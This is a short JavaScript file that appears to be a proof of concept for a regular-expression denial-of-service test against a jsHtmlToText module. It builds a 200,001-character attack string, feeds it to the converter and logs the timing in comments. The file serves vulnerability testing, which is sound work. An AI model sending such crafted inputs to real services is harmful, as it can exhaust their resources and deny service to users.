const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aa"*100000+"A"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aa";
}
str += "A";

var result = htmlToText(str, false);

// real    0m0.154s
// user    0m0.125s
// sys     0m0.010s
